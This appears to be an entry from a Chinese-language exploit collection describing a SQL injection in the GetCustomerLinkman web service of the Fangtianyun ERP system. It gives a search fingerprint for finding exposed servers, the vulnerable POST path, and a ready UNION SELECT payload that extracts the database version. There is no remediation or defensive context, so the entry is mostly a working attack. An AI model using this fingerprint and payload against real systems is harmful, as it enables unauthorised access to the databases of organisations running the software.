# 方天云ERP系统GetCustomerLinkman存在SQL注入漏洞

方天云ERP系统 ｜ SQL注入 ｜ —
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1`

**Payload**
```
{clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}
```
- **响应特征**：200